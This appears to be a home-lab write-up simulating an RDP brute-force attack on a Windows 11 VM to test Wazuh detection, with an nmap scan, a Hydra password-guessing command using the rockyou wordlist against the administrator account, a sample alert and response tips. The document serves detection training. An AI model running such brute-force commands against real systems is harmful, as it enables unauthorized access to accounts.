# Attack Simulation: Unauthorized Access Attempt (Brute Force)

## 🎯 Objective
Simulate a brute force login attack on a domain-joined Windows machine to test Wazuh detection and response capabilities.

---

## 🧪 Lab Setup
- **Attacker Machine**: Kali Linux (internal lab network)
- **Target Machine**: Windows 11 VM (joined to `lab.domain.local`)
- **Tools Used**: Hydra, Nmap, Event Viewer, Wazuh Dashboard

---

## 🛠️ Attack Execution

### 1. Port Scan for RDP
```bash
nmap -p 3389 10.0.0.X
```

### 2. Brute Force with Hydra
```bash
hydra -t 4 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.0.0.X
```

### 3. Observe Target Logs
- Check `Security` event log via Event Viewer
- Look for Event ID `4625`: An account failed to log on

---

## 📈 Wazuh Detection

### Triggered Alert:
```json
{
  "rule": {
    "id": "18107",
    "level": 10,
    "description": "Windows Logon Failed (Event ID 4625)"
  },
  "agent": {
    "name": "win-victim",
    "ip": "10.0.0.X"
  },
  "srcip": "10.0.0.Y",
  "data": {
    "win": {
      "eventdata": {
        "LogonType": "10",
        "TargetUserName": "administrator"
      }
    }
  }
}
```

### Response Recommendations:
- Lock offending source IP via firewall or Wazuh Active Response
- Trigger JIRA ticket with automated alert integration

---

## 📘 Lessons Learned
- Wazuh accurately detects brute force attempts with built-in rules
- Customize thresholds for repeat failed logins to fine-tune sensitivity
- Consider adding honeypots to mislead attackers and trigger early warnings

---

## 📎 Related Artifacts
- [alerts/brute-force-alert.json](../alerts/brute-force-alert.json) *(sample)*
- [playbooks/incident-brute-force.md](../playbooks/incident-brute-force.md)

---

## 🔐 Ethical Use Reminder
This simulation was performed in a closed, authorized lab environment.  
Always conduct attack simulations with explicit permission and responsible intent.
